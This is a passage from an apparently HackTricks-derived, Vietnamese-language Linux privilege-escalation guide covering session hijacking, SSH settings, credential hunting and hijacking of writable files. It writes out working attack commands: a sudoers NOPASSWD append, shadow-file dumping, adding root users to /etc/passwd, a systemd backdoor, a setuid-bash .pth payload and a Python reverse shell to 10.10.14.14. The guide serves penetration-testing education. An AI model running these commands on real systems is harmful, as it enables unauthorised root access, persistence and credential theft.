echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

Đây là một đường dẫn persistence/privesc ACL có tác động lớn vì rất dễ bị bỏ sót khi chỉ kiểm tra bằng `ls -l`.

## Các phiên shell đang mở

Khả năng truy cập GNU Screen giữa các user phụ thuộc vào **cấu hình và ACL của phiên đang chạy**, chứ không chỉ vào phiên bản. [Tài liệu GNU Screen](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) cho biết chương trình phải được build với hỗ trợ multiuser; `multiuser on` và một quyền cấp bằng `acladd` hoặc `aclchg` phù hợp sẽ cho phép user khác attach. [Tài liệu cũng yêu cầu setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) để tra cứu phiên giữa các user. Chỉ riêng việc thấy socket thuộc sở hữu root hoặc một binary `screen` SUID không chứng minh rằng có thể attach vào shell root. Hãy xác nhận phiên đang hoạt động bật multiuser, user hiện tại có quyền nhập lệnh/thực thi hiệu lực, và shell trong phiên đó chạy với quyền của chủ sở hữu có đặc quyền trước khi coi đây là một cách leo thang đặc quyền.

### Chiếm quyền các phiên screen

**Liệt kê các phiên screen**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![Chiếm quyền điều khiển phiên screen - Vị trí socket (một số hệ thống hiển thị một vị trí dưới dạng liên kết tượng trưng của vị trí còn lại): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Kết nối vào một phiên**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux sessions hijacking

Đây là vấn đề ở **các phiên bản tmux cũ**. Tôi không thể chiếm quyền một phiên tmux (v2.1) do root tạo khi dùng tài khoản không có đặc quyền.

**Liệt kê các phiên tmux**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Vị trí socket (một số hệ thống cung cấp một socket dưới dạng symlink của socket còn lại) - tmux sessions hijacking: tmux -S /tmp/dev sess ls Liệt kê bằng socket đó; bạn có thể khởi chạy một phiên tmux trên socket đó...](<../../images/image (837).png>)

**Gắn vào một phiên**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Xem **Valentine box from HTB** để biết ví dụ.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Các key được tạo bằng những bản build OpenSSL bị ảnh hưởng của Debian hoặc các bản phân phối phái sinh trong giai đoạn có lỗ hổng trước đây có thể có tính ngẫu nhiên dễ đoán; bản phân phối hiện tại của host hoặc phiên bản OpenSSL đã được vá không cho biết một key cũ được tạo như thế nào. Hãy kiểm tra **key cụ thể** bằng một danh sách chặn lịch sử phù hợp và xác minh nguồn gốc của key. Hướng dẫn [`ssh-vulnkey` của Debian](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) mô tả cách kiểm tra public key và `authorized_keys`, còn [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) ghi nhận bản vá OpenSSL. Một mục trong `authorized_keys` của tài khoản có đặc quyền chỉ là manh mối leo thang đặc quyền nếu có thể khôi phục private key tương ứng và chính sách SSH có hiệu lực vẫn chấp nhận key đó cho tài khoản ấy; một **host** key yếu tự nó không phải là thông tin xác thực để đăng nhập. Hãy thay thế các key bị xâm phạm và xóa các quyền cấp cũ của chúng.

### Các giá trị cấu hình SSH đáng chú ý

- **PasswordAuthentication:** Chỉ định liệu có cho phép xác thực bằng mật khẩu hay không. Giá trị mặc định của OpenSSH upstream là `yes`; cấu hình của bản phân phối có thể ghi đè giá trị này.
- **PubkeyAuthentication:** Chỉ định liệu có cho phép xác thực bằng public key hay không. Giá trị mặc định là `yes`.
- **PermitEmptyPasswords**: Khi cho phép xác thực bằng mật khẩu, tùy chọn này chỉ định liệu server có cho phép đăng nhập vào các tài khoản có chuỗi mật khẩu rỗng hay không. Giá trị mặc định là `no`.

### Các tệp kiểm soát đăng nhập

Các tệp này ảnh hưởng đến việc ai có thể đăng nhập và cách thức đăng nhập:

- **`/etc/nologin`**: nếu tồn tại, chặn đăng nhập của người dùng không phải root và hiển thị thông báo trong tệp.
- **`/etc/securetty`**: giới hạn nơi root có thể đăng nhập (danh sách TTY được phép).
- **`/etc/motd`**: banner sau khi đăng nhập (có thể leak thông tin về môi trường hoặc bảo trì).

### PermitRootLogin

Chỉ định liệu root có thể đăng nhập bằng SSH hay không. Giá trị mặc định của OpenSSH upstream là `prohibit-password`; cấu hình của bản phân phối có thể ghi đè giá trị này. Các giá trị có thể có:

- `yes`: root có thể đăng nhập bằng mật khẩu và private key
- `without-password` hoặc `prohibit-password`: root chỉ có thể đăng nhập bằng private key
- `forced-commands-only`: Root chỉ có thể đăng nhập bằng private key và khi các tùy chọn commands được chỉ định
- `no` : không cho phép

### Các certificate authority SSH user được tin cậy

`TrustedUserCAKeys` chỉ định các public key mà sshd tin cậy để ký certificate **user**. Nếu một người dùng có ít đặc quyền hơn có thể đọc private CA key tương ứng, hãy xem xét ai có thể nhận certificate và certificate đó có thể xác thực bằng principal của tài khoản nào. `AuthorizedPrincipalsFile` hoặc `AuthorizedPrincipalsCommand` có thể giới hạn các tên được chấp nhận; nếu không cấu hình cả hai, certificate phải chứa tên tài khoản đích. `PermitRootLogin prohibit-password` chặn xác thực root bằng mật khẩu nhưng vẫn có thể cho phép xác thực bằng certificate. Chỉ thấy đường dẫn đến key bị lộ không chứng minh được khả năng truy cập: hãy xác nhận cặp public/private key, các quy tắc `Match` có hiệu lực, chính sách tài khoản, passphrase của key, trạng thái thu hồi và các thuật toán chữ ký được chấp nhận. Không đưa dữ liệu private key vào đầu ra khi liệt kê. Xem [hướng dẫn cấu hình server OpenSSH](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).

Private CA key cũng có thể được sử dụng **mà không cần người dùng hiện tại đọc được key** nếu một quy tắc ủy quyền đặc quyền cho phép người dùng đó gọi một [certificate signer không bị giới hạn như `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s) dưới danh tính của chủ sở hữu key. Đối chiếu chính xác command và đối số được cho phép với quyền truy cập key của tài khoản signer, CA public được cấu hình sshd có hiệu lực tin cậy, principal được chấp nhận cho tài khoản đích, thời hạn hiệu lực của certificate và chính sách đăng nhập của tài khoản đó. Một command signer được ủy quyền hoặc một CA file đáng tin cậy tự nó không chứng minh được khả năng truy cập tài khoản khác; không ký certificate thử nghiệm trong quá trình liệt kê thụ động.

Để biết về đường dẫn tin cậy CA riêng cho từng tài khoản, xem [SSH certificate principal delimiter confusion](../../../network-services-pentesting/pentesting-ssh.md#ssh-certificate-principal-delimiter-confusion).

### AuthorizedKeysFile

Chỉ định các tệp chứa public key có thể dùng để xác thực người dùng. Tệp có thể chứa các token như `%h`, được thay thế bằng thư mục home. **Bạn có thể chỉ định đường dẫn tuyệt đối** (bắt đầu bằng `/`) hoặc **đường dẫn tương đối tính từ thư mục home của người dùng**. Ví dụ:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Cấu hình đó sẽ cho biết rằng nếu bạn thử đăng nhập bằng **private** key của người dùng "**testusername**", ssh sẽ so sánh public key của bạn với các key nằm trong `/home/testusername/.ssh/authorized_keys` và `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding cho phép bạn **sử dụng SSH keys cục bộ thay vì để các key** (không có passphrase!) nằm trên server. Nhờ đó, bạn có thể **nhảy** qua ssh **đến một host** rồi từ đó **nhảy tiếp đến một host khác** **bằng** **key** nằm trên **host ban đầu**.

Bạn cần đặt tùy chọn này trong `$HOME/.ssh.config` như sau:

```
Host example.com
  ForwardAgent yes
```

Lưu ý rằng nếu `Host` là `*`, mỗi khi người dùng chuyển sang máy khác, máy đó sẽ có thể truy cập các khóa (đây là vấn đề bảo mật).

Tệp `/etc/ssh_config` có thể **ghi đè** các **tùy chọn** này và cho phép hoặc từ chối cấu hình này.\
Tệp `/etc/sshd_config` có thể **cho phép** hoặc **từ chối** chuyển tiếp ssh-agent bằng từ khóa `AllowAgentForwarding` (mặc định là cho phép).

Nếu bạn phát hiện Forward Agent được cấu hình trong một môi trường, hãy đọc trang sau vì **bạn có thể lạm dụng nó để leo thang đặc quyền**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Các tệp đáng chú ý

### Các tệp profile

Tệp `/etc/profile` và các tệp trong `/etc/profile.d/` là **các script được thực thi khi người dùng mở một shell mới**. Do đó, nếu bạn có thể **ghi hoặc sửa đổi bất kỳ tệp nào trong số này, bạn có thể leo thang đặc quyền**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Nếu tìm thấy script profile nào kỳ lạ, bạn nên kiểm tra xem nó có chứa **thông tin nhạy cảm** hay không.

### Tệp Passwd/Shadow

Tùy thuộc vào hệ điều hành, các tệp `/etc/passwd` và `/etc/shadow` có thể được đặt tên khác hoặc có thể có bản sao lưu. Vì vậy, bạn nên **tìm tất cả các tệp này** và **kiểm tra xem bạn có thể đọc chúng không** để xem **bên trong có chứa hash hay không**:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

Trong một số trường hợp, bạn có thể tìm thấy **password hashes** bên trong tệp `/etc/passwd` (hoặc tệp tương đương).

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### /etc/passwd có thể ghi

Trước tiên, tạo một mật khẩu bằng một trong các lệnh sau.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Sau đó thêm người dùng hacker và đặt mật khẩu đã tạo.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Ví dụ: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Giờ bạn có thể dùng lệnh `su` với `hacker:hacker`

Ngoài ra, bạn có thể dùng các dòng sau để thêm một người dùng giả không có mật khẩu.\
CẢNH BÁO: điều này có thể làm giảm mức độ bảo mật hiện tại của máy.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

LƯU Ý: Trên các nền tảng BSD, `/etc/passwd` nằm tại `/etc/pwd.db` và `/etc/master.passwd`; `/etc/shadow` cũng được đổi tên thành `/etc/spwd.db`.

Bạn nên kiểm tra xem mình có thể **ghi vào một số tệp nhạy cảm** hay không. Ví dụ, bạn có thể ghi vào một **tệp cấu hình dịch vụ** nào đó không?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Ví dụ, nếu máy đang chạy máy chủ **tomcat** và bạn có thể **sửa đổi tệp cấu hình dịch vụ Tomcat trong /etc/systemd/,** thì bạn có thể sửa đổi các dòng:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Backdoor của bạn sẽ được thực thi vào lần tiếp theo tomcat khởi động.

### Kiểm tra thư mục

Các thư mục sau có thể chứa bản sao lưu hoặc thông tin đáng chú ý: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Có lẽ bạn sẽ không thể đọc thư mục cuối cùng, nhưng hãy thử)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Vị trí bất thường/Tệp do người dùng sở hữu

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### Các tệp được sửa đổi trong vài phút gần đây

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Tệp DB SQLite

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

Đối với cơ sở dữ liệu ứng dụng có thể đọc được, hãy kiểm tra tên bảng và tên cột để tìm tên người dùng và các giá trị hash mật khẩu. Tìm thấy một hash, khôi phục mật khẩu của nó và chứng minh mật khẩu đó được dùng lại cho một tài khoản cục bộ là các bước riêng biệt; một chuỗi hex chung chung gồm 32 ký tự không đủ để kết luận đó là MD5 hoặc tài khoản có thể truy cập được.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml tệp

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

Nếu lịch sử shell có thể đọc được chứa một lệnh `sudo` theo sau là một dòng ngắn trông giống mật khẩu, hãy kiểm tra thủ công các dòng xung quanh. Mật khẩu được nhập tại dấu nhắc thông thường của `sudo` sẽ không được lưu trong lịch sử shell; dòng theo sau chỉ có thể là nội dung vô tình nhập vào shell, chứ không chứng minh đó là mật khẩu hợp lệ. Tệp đánh dấu `.sudo_as_admin_successful` ghi nhận việc sử dụng trước đây, không phải quyền được cấp hiện tại.

### Tệp ẩn

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **Script/Tệp nhị phân trong PATH**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Tệp web**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Bản sao lưu**

Kiểm tra các tệp có thể đọc được bên trong thư mục sao lưu, cũng như các tệp có **tên** chứa `backup`: một archive có tên khó nhận biết hoặc phần mở rộng đã mã hóa vẫn có thể làm lộ dữ liệu ứng dụng cũ. Archive đã mã hóa chỉ là một đối tượng có nguy cơ lộ dữ liệu. Cần xác minh riêng việc khôi phục mật khẩu, kiểm tra nội dung, khôi phục hash của ứng dụng và dùng lại mật khẩu đó cho tài khoản Unix; hash trong archive không chứng minh rằng có thể đăng nhập cục bộ.

Các bản sao lưu máy ảo có thể đọc được cũng cần được kiểm tra tương tự. Tệp cấu hình VirtualBox `.vbox` có thể xác định các image `.vdi` được đính kèm và chứa metadata về khóa ổ đĩa đã mã hóa; [tài liệu VirtualBox cho biết khóa dữ liệu đã mã hóa được lưu trong cấu hình VM](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). Cả cấu hình và image đều phải có thể truy cập thì mới có thể kiểm tra ổ đĩa offline. Volume của guest có thể có thêm một [lớp mã hóa LUKS](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc), cần một khóa riêng. Ngay cả sau khi giải mã được ủy quyền, script hoặc cấu hình cũ vẫn có thể chứa mật khẩu; hãy xác định thông tin xác thực đó còn dùng được cho tài khoản trên host hay không và chính sách `sudo` hiệu lực có cho phép chạy lệnh với quyền cao hơn hay không trước khi xem đây là một trường hợp local privilege escalation. Khi kiểm kê thụ động, hãy ghi nhận đường dẫn và quyền truy cập mà không sao chép, giải mã hoặc mount image.

Khi kiểm tra archive có thể đọc được, hãy liệt kê tên các thành viên trước khi giải nén: có thể có tệp authenticator ẩn, dữ liệu mã khôi phục hoặc SSH key, ngay cả khi các bản đang dùng được bảo vệ. Tên tệp chỉ là manh mối; hãy xác minh riêng dữ liệu đó và việc dùng lại thông tin xác thực cho tài khoản.

Ưu tiên **các archive có thể đọc được nhưng thuộc sở hữu của người dùng khác** trong thư mục sao lưu, đặc biệt là archive do root sở hữu và archive có thể truy cập thông qua tư cách thành viên nhóm. Archive cũ có thể chứa cấu hình hoặc bí mật xác thực ngay cả khi bản đang dùng được bảo vệ. Với giao diện sao lưu cục bộ như [Backrest](https://garethgeorge.github.io/backrest/), hãy kiểm tra tài khoản hiệu lực của dịch vụ và liệu người dùng có quyền thấp hơn có thể đọc cấu hình hoặc xác thực với giao diện hay không. [Hooks](https://garethgeorge.github.io/backrest/docs/hooks) và [giao diện lệnh restic](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) của Backrest có thể hoạt động với quyền truy cập tệp và quyền thực thi lệnh của daemon; chỉ dựa vào việc listener lắng nghe trên loopback thì chưa thể xác định mức độ ảnh hưởng. `passwordBcrypt` của Backrest là hash bcrypt được mã hóa base64 trong [mã xác thực](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go), không phải mật khẩu dạng văn bản thuần. Hãy xác minh danh tính dịch vụ, thông tin xác thực có thể sử dụng và quyền truy cập vào plan hoặc repository liên quan trước khi xem archive hoặc giao diện bị lộ là một ranh giới đặc quyền.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Các tệp đã biết có chứa mật khẩu

Đọc mã của [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), công cụ này tìm kiếm **nhiều tệp có khả năng chứa mật khẩu**.\
**Một công cụ thú vị khác** bạn có thể dùng là: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), một ứng dụng mã nguồn mở dùng để truy xuất nhiều mật khẩu được lưu trên máy tính cục bộ chạy Windows, Linux và Mac.

Nếu có thể đọc `/etc/guacamole/guacamole.properties`, hãy xem lại các cài đặt kết nối cơ sở dữ liệu `mysql-*`, `postgresql-*` hoặc `sqlserver-*`. Nếu tài khoản được phép đọc các bảng Guacamole JDBC, `guacamole_connection_parameter` có thể chứa các giá trị `username`, `password`, `private-key` hoặc `passphrase` SSH đã lưu. Hãy bắt đầu bằng ID kết nối và tên tham số, sau đó chỉ kiểm tra các hàng liên quan; giá trị đã lưu có thể là token động hoặc tham chiếu đến vault thay vì một bí mật có thể tái sử dụng. Xem [lược đồ Guacamole JDBC](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) và [các tham số kết nối SSH](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).

Trình quản lý mật khẩu [pswm](https://github.com/Julynx/pswm#usage) mặc định lưu vault được mã hóa tại `~/.local/share/pswm/pswm`. Nếu có thể nhìn thấy vault của người dùng khác, hãy kiểm tra quyền sở hữu và xem tài khoản của bạn có thực sự đọc được nó hay không. Chỉ biết đường dẫn vault không giúp lộ thông tin đăng nhập; khôi phục mật khẩu chính của vault, tìm mật khẩu tài khoản có thể tái sử dụng và xác nhận đặc quyền của tài khoản đó là những bước riêng biệt.

[Cơ sở dữ liệu mặc định của Passpie](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) là `~/.passpie/`, gồm một keyring `.keys` và các tệp thông tin xác thực `.pass` được mã hóa trong các thư mục nhóm. Có thể nhìn thấy thư mục cơ sở dữ liệu chỉ là manh mối về đường dẫn: hãy xác nhận quyền truy cập vào khóa và mục được mã hóa có liên quan, mọi mật khẩu cụm chính cần thiết, cũng như liệu thông tin xác thực khôi phục được có thuộc về một tài khoản có đặc quyền cao hơn hay không. Passpie cũng hỗ trợ [đường dẫn cơ sở dữ liệu tùy chỉnh](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases), vì vậy đường dẫn mặc định không bao quát mọi trường hợp. Việc liệt kê tự động nên chỉ hiển thị siêu dữ liệu, không xuất thông tin xác thực hay in nội dung khóa.

### Nhật ký

Nếu có thể đọc nhật ký, bạn có thể tìm thấy **thông tin thú vị/bảo mật trong đó**. Nhật ký càng bất thường thì càng có thể chứa thông tin thú vị.\
Ngoài ra, một số **audit logs** được cấu hình “tệ” (có cài backdoor?) có thể cho phép bạn **ghi lại mật khẩu** bên trong audit logs như được giải thích trong bài viết này: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Để **đọc nhật ký, nhóm** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) sẽ rất hữu ích.

### Tệp Shell

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Tìm kiếm Creds/Regex chung

Bạn cũng nên kiểm tra các tệp có từ "**password**" trong **tên** hoặc trong **nội dung**, đồng thời kiểm tra IP và email trong log, hoặc các regex hash.\
Tôi sẽ không liệt kê cách thực hiện tất cả những việc này ở đây, nhưng nếu quan tâm, bạn có thể xem các bước kiểm tra cuối cùng mà [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) thực hiện.

## Tệp có quyền ghi

### Python library hijacking

Nếu bạn biết một script python sẽ được chạy **từ đâu** và bạn **có thể ghi vào** thư mục đó hoặc bạn có thể **sửa đổi các thư viện python**, bạn có thể sửa đổi thư viện OS và cài backdoor vào đó (nếu bạn có thể ghi vào nơi script python sẽ được chạy, hãy sao chép và dán thư viện os.py).

Để **cài backdoor vào thư viện**, chỉ cần thêm dòng sau vào cuối thư viện os.py (thay đổi IP và PORT):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

#### `.pth` có thể ghi được được xử lý bởi `site.addsitedir()`

Đừng xem `site.addsitedir(DIR)` tương đương với `sys.path.append(DIR)`. Hàm này cũng xử lý mọi tệp `*.pth` trong `DIR`. Dòng bắt đầu bằng `import` theo sau là dấu cách hoặc tab sẽ được thực thi dưới dạng mã Python. Các dòng chứa đường dẫn được phân giải tương đối với thư mục site và chỉ được thêm vào nếu chúng tồn tại.<sup>[[38]](#references)</sup>

Điều này trở thành một lỗ hổng leo thang đặc quyền khi chương trình Python được phép chạy bằng sudo hoặc có đặc quyền theo cách khác gọi `site.addsitedir()` trên một thư mục mà người dùng hiện tại hoặc một trong các nhóm của họ có thể ghi. Mã trong `.pth` chạy trong khi chương trình có đặc quyền đang thiết lập đường dẫn import, trước khi hành động thông thường của chương trình được thực thi.<sup>[[38]](#references)[[39]](#references)</sup>

```bash
# Find explicit consumers and inspect every selected directory's ownership
grep -R "site\.addsitedir" /opt /usr/local 2>/dev/null
namei -l /opt/app/plugins/dev
find /opt/app/plugins/dev -maxdepth 1 -type f -name '*.pth' -ls

# Verify execution through a one-line path configuration file
printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
sudo /usr/bin/python3 /opt/app/controller.py status
```

Nội dung `.pth` có thể thực thi phải nằm trên một dòng, nhưng dấu chấm phẩy cho phép chạy nhiều câu lệnh. Ví dụ, một đường dẫn thực thi với quyền root có thể tạo bản sao Bash có setuid; gọi Bash với `-p` để giữ nguyên ID hiệu lực.<sup>[[39]](#references)</sup>

```bash
printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
  > /opt/app/plugins/dev/pwn.pth
sudo /usr/bin/python3 /opt/app/controller.py status
/tmp/rootshell -p
```

Tùy chọn `-S` chỉ tắt việc tự động khởi tạo `site` của Python. Tùy chọn này không bảo vệ chương trình chủ động import `site` và gọi `site.addsitedir()`. Hãy xóa các thư mục mà attacker có thể ghi khỏi đường dẫn import có đặc quyền, đồng thời yêu cầu thư mục và các tệp `.pth` của nó chỉ thuộc sở hữu và chỉ có thể được ghi bởi quản trị viên có đặc quyền.<sup>[[38]](#references)[[39]](#references)</sup>

### Khai thác logrotate

Một tác vụ `logrotate` có đặc quyền có thể tạo ra đường dẫn ghi tệp xuyên người dùng khi nó thực sự rotate một log bên dưới thư mục mà người dùng có đặc quyền thấp hơn có thể thay thế hoặc chuyển hướng trong lúc rotation. Chỉ riêng việc có thể ghi vào log mới chỉ là manh mối. Hãy xác nhận quy tắc đang hoạt động chính xác cùng các chỉ thị `create`, `olddir` và `su`; danh tính hiệu lực của scheduler; quyền ghi và tìm kiếm trên thư mục cha của log; và liệu bản build cùng chính sách đã cài đặt có cho phép thay đổi đích hay không. Một shell có đặc quyền được mở sau đó cũng phải tải tệp vừa tạo thì thao tác ghi vào tệp khởi động mới có thể dẫn đến thực thi lệnh. Kiểm tra lịch chạy, quy tắc, phiên bản/cách đóng gói và metadata của đường dẫn mà không kích hoạt rotation hoặc thử race condition.

> [!TIP]
> Đừng xem `3.18.0` hay bất kỳ chuỗi phiên bản nào là ngưỡng duy nhất để xác định khả năng khai thác. [Change log của upstream](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) ghi nhận các biện pháp hardening thư mục và symlink trong nhiều bản phát hành, và các bản phân phối có thể backport bản sửa lỗi. [Tài liệu hướng dẫn của upstream](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) khuyến nghị dùng `su` khi root rotate log trong các thư mục do người dùng không có đặc quyền kiểm soát; hãy xác minh quy tắc hiệu lực và hành vi thực tế.

Bạn có thể tìm thêm thông tin chi tiết về lỗ hổng tại trang này: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Bạn có thể khai thác lỗ hổng này bằng [**logrotten**](https://github.com/whotwagner/logrotten).

Lỗ hổng này rất giống với [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(log nginx),** vì vậy mỗi khi phát hiện bạn có thể chỉnh sửa log, hãy kiểm tra ai đang quản lý các log đó và liệu bạn có thể nâng cao đặc quyền bằng cách thay log bằng symlink hay không.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Tham chiếu lỗ hổng:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Tệp `ifcfg-*` là một manh mối cần kiểm tra khi người dùng có đặc quyền thấp hơn có thể tạo hoặc chỉnh sửa tệp đó **và** một đường kích hoạt mạng có đặc quyền sẽ đọc chính xác tệp đó. Hãy xác nhận quyền hiệu lực của tệp và thư mục, interface được chọn, cách triển khai `ifup`/`ifdown` đã cài đặt và người gọi chúng. Chỉ riêng việc có thể ghi vào tệp không dẫn đến thực thi. [Hướng dẫn mạng RHEL 7 của Red Hat](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) phân biệt các network script cũ với NetworkManager: bản thân NetworkManager không kích hoạt các script cũ. [Tài liệu RHEL 8](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) cho biết `ifup`/`ifdown` mặc định sử dụng NetworkManager, còn gói legacy tùy chọn cung cấp các shell script.

